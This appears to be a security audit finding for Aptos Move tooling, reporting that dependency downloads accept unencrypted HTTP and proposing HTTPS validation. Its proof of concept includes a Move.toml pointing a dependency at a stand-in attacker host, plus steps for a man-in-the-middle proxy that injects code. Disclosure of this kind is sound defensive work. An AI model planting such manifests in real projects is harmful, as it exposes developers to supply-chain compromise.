# Audit Report

## Title
Missing HTTPS Enforcement in Move Package Dependency Downloads Enables Supply Chain Attacks

## Summary
The `maybe_download_package()` function in `package_hooks.rs` does not enforce HTTPS when downloading Move package dependencies from on-chain sources. An attacker can specify an HTTP URL in Move.toml dependencies, allowing man-in-the-middle (MITM) attacks to inject malicious Move code during the package compilation process.

## Finding Description

The Aptos Move package system supports downloading on-chain packages as dependencies via custom dependency specifications in Move.toml. When a developer specifies an Aptos dependency with a `node_url`, this URL is used to connect to a REST endpoint and download the package source code.

The vulnerability exists in the complete absence of URL scheme validation across the dependency download chain: [1](#0-0) 

The `maybe_download_package()` function directly parses the `node_url` string without validating that it uses HTTPS. This parsed URL is then passed to `CachedPackageRegistry::create()`: [2](#0-1) 

The registry creation accepts any URL scheme and creates a REST client: [3](#0-2) 

The client builder similarly accepts custom URLs without scheme validation: [4](#0-3) 

**Attack Path:**

1. Attacker creates a malicious repository containing a Move.toml with an HTTP dependency:
   ```toml
   [dependencies]
   framework = { aptos = "http://attacker-controlled-node.com", address = "0x1" }
   ```

2. Victim developer clones the repository (or the dependency specification is injected via other supply chain means)

3. Developer runs `aptos move compile` to build the package

4. During dependency resolution, the system calls `resolve_custom_dependency()`: [5](#0-4) 

5. The HTTP URL is parsed and used to download package metadata and source code over unencrypted HTTP

6. Attacker performing MITM intercepts the HTTP traffic and modifies the package source code, injecting malicious Move code

7. The compromised package source is saved to disk: [6](#0-5) 

8. The malicious code is compiled as a dependency and included in the final package

This breaks the supply chain integrity guarantee that packages downloaded from trusted on-chain sources remain unmodified during transit.

## Impact Explanation

This vulnerability is classified as **HIGH severity** per the Aptos bug bounty program for the following reasons:

1. **Significant Protocol Violation**: It breaks the trust model for Move package dependencies. Developers expect that packages downloaded from on-chain sources are authentic and unmodified. This vulnerability allows silent modification of dependency code during download.

2. **Potential for Validator Node Impact**: If malicious code is injected into packages used by validators or node operators, it could lead to:
   - Validator node slowdowns or crashes (HIGH severity: "Validator node slowdowns")
   - Consensus issues if different nodes compile with different injected code versions
   - State inconsistencies if malicious code manipulates storage operations

3. **Supply Chain Attack Vector**: This is a classic supply chain attack that could affect:
   - Smart contract developers whose packages get compromised
   - Users who interact with compromised contracts
   - The broader Aptos ecosystem if popular packages are targeted

The impact depends on what the injected malicious code does, but possibilities include:
- Theft of private keys or sensitive data embedded in Move code
- Modification of transaction logic to redirect funds
- Introduction of backdoors or logic bombs
- Manipulation of governance or staking operations

## Likelihood Explanation

The likelihood is **MEDIUM to HIGH**:

**Factors Increasing Likelihood:**
- Developers commonly clone repositories without thoroughly inspecting Move.toml dependencies
- Automated tools or CI/CD pipelines may generate or modify Move.toml files
- Social engineering could trick developers into using malicious repositories
- HTTP is still commonly used in development/testing environments

**Factors Decreasing Likelihood:**
- Requires the victim to have an HTTP URL in their Move.toml (not HTTPS)
- Most official Aptos examples and documentation likely use HTTPS
- Requires attacker to be in MITM position (local network, compromised router, etc.)

However, the ease of exploitation (simply requiring an HTTP URL specification) and the severe potential impact make this a significant risk.

## Recommendation

Implement strict HTTPS enforcement for all package downloads. Add URL scheme validation before creating the REST client:

```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        // Parse and validate URL scheme
        let url = Url::parse(info.node_url.as_str())?;
        
        // Enforce HTTPS for security
        if url.scheme() != "https" {
            bail!(
                "Package download URLs must use HTTPS for security. Found: {}. \
                Please update your Move.toml to use HTTPS URLs.",
                url.scheme()
            );
        }
        
        let registry = CachedPackageRegistry::create(
            url,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
}
```

Additionally, consider adding the validation at the REST client level as defense-in-depth:

```rust
impl Client {
    pub fn new(base_url: Url) -> Self {
        // Validate HTTPS scheme
        if base_url.scheme() != "https" {
            panic!(
                "REST client URLs must use HTTPS for security. Found: {}",
                base_url.scheme()
            );
        }
        Self::builder(AptosBaseUrl::Custom(base_url)).build()
    }
}
```

## Proof of Concept

**Setup:**

1. Create a malicious Move.toml:
```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousFramework = { aptos = "http://attacker-controlled.com:8080", address = "0x1" }

[addresses]
victim = "_"
```

2. Set up a MITM proxy on port 8080 that:
   - Intercepts GET requests to `/v1/accounts/0x1/resource/0x1::code::PackageRegistry`
   - Returns valid package metadata
   - Modifies the source code in the response to inject malicious Move code

3. Run the compilation:
```bash
cd victim_package
aptos move compile
```

4. Observe that:
   - The HTTP request is made to the attacker-controlled server
   - The package is downloaded over unencrypted HTTP
   - The malicious code is saved to `~/.move/http_attacker-controlled_com_8080_0x1_MaliciousFramework/`
   - The malicious code is compiled as a dependency
   - No warning or error is displayed about the HTTP scheme

**Expected Secure Behavior:**
The compilation should fail with an error message:
```
Error: Package download URLs must use HTTPS for security. Found: http.
Please update your Move.toml to use HTTPS URLs.
```

## Notes

This vulnerability affects the developer-facing Move package tooling, not the consensus or validator nodes directly. However, if malicious code is successfully injected and deployed to the blockchain, it could indirectly affect validators and the network depending on the nature of the malicious code.

The issue is exacerbated by the fact that there are no warnings or security notices when HTTP URLs are used, making it a silent security degradation that developers may not notice.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L38-54)
```rust
async fn maybe_download_package(info: &CustomDepInfo) -> anyhow::Result<()> {
    if !info
        .download_to
        .join(CompiledPackageLayout::BuildInfo.path())
        .exists()
    {
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
        let package = registry.get_package(info.package_name).await?;
        package.save_package_to_disk(info.download_to.as_path())
    } else {
        Ok(())
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L43-69)
```rust
    pub async fn create(
        url: Url,
        addr: AccountAddress,
        with_bytecode: bool,
    ) -> anyhow::Result<Self> {
        let client = Client::new(url);
        // Need to use a different type to deserialize JSON
        let inner = client
            .get_account_resource_bcs::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
            .await?
            .into_inner();
        let mut bytecode = BTreeMap::new();
        if with_bytecode {
            for pack in &inner.packages {
                for module in &pack.modules {
                    let bytes = client
                        .get_account_module(addr, &module.name)
                        .await?
                        .into_inner()
                        .bytecode
                        .0;
                    bytecode.insert(module.name.clone(), bytes);
                }
            }
        }
        Ok(Self { inner, bytecode })
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L161-181)
```rust
    pub fn save_package_to_disk(&self, path: &Path) -> anyhow::Result<()> {
        fs::create_dir_all(path)?;
        fs::write(
            path.join("Move.toml"),
            unzip_metadata_str(&self.metadata.manifest)?,
        )?;
        let sources_dir = path.join(CompiledPackageLayout::Sources.path());
        fs::create_dir_all(&sources_dir)?;
        for module in &self.metadata.modules {
            match module.source.is_empty() {
                true => {
                    println!("module without code: {}", module.name);
                },
                false => {
                    let source = unzip_metadata_str(&module.source)?;
                    fs::write(sources_dir.join(format!("{}.move", module.name)), source)?;
                },
            };
        }
        Ok(())
    }
```

**File:** crates/aptos-rest-client/src/lib.rs (L134-136)
```rust
    pub fn new(base_url: Url) -> Self {
        Self::builder(AptosBaseUrl::Custom(base_url)).build()
    }
```

**File:** crates/aptos-rest-client/src/client_builder.rs (L23-31)
```rust
impl AptosBaseUrl {
    pub fn to_url(&self) -> Url {
        match self {
            AptosBaseUrl::Mainnet => Url::from_str("https://api.mainnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Devnet => Url::from_str("https://api.devnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Testnet => Url::from_str("https://api.testnet.aptoslabs.com").unwrap(),
            AptosBaseUrl::Custom(url) => url.to_owned(),
        }
    }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L612-614)
```rust
        if let Some(node_info) = &dep.node_info {
            package_hooks::resolve_custom_dependency(dep_name, node_info)?
        }
```
